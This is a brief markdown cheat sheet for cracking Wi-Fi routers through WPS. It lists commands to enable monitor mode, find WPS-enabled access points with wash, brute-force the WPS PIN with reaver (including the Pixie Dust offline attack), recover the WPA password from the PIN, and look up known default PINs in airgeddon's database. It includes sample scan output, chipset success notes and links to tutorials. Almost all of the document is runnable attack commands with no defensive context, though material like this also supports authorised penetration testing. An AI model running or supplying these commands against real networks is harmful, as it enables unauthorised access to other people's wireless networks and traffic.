##WPS

### Normal setup

```text
sudo systemctl stop NetworkManager
sudo airmon-ng check kill
sudo iw dev
```
#### Create Monitor Mode Device

```text
sudo ip link set wlan0 down
sudo iw dev wlan0 interface add wlan0mon type monitor
sudo ip link set wlan0mon up					            
```

### Check for networks with WPS available
```text
sudo wash -i wlan0mon
```

```text
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
AA:BB:CC:XX:YY:ZZ    1  -88  2.0  No   Broadcom  linksys
```

### Attacks to retrieve the pin

#### Standard attack
```text
sudo reaver  -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv
```

#### Pixie dust offline attack - (-K 1)
```text
sudo reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv -K 1
```

### Resolve password from pin
```text
sudo reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv -p 12345678
```

#### Notes
Success running this attack against Ralink and RealTek chipsets. And very spotty success against Broadcom chipsets
```text
sudo reaver -i {monitor interface} -b {BSSID of router} -c {router channel} -vvv -K 1 -f
```
#### Airgeddon - Known Pins
```text
source /usr/share/airgeddon/known_pins.db
echo ${PINDB["0013F7"]}	#first three parts of the BSSID CODE
echo /usr/share/airgeddon/known_pins.db ${PINDB["0013F7"]} 
grep "0013F7" /usr/share/airgeddon/known_pins.db
```

https://kalitut.com/wifi-attack-with-wps-using-reaver/

https://axcheron.github.io/hacking-wps-using-reaver-and-pixie-dust-attack/
